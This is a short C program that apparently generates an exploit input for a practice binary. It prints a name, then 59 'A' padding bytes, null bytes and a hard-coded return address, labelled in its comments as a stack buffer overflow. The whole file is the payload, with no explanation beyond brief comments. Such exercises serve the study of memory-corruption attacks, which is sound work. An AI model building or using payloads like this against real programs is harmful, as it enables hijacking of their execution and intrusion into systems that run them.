#include <stdio.h>
int main() {

    // first name
    printf("heron\n");                  // 6

    // second (stack buffer overflow)
    int n = 59;                         // n
    while(n--)  printf("A");
    printf("\x00\x00\x00\x00\x00\x0e\x86\x04\x08");         // 4

    // end
    return 0;
}
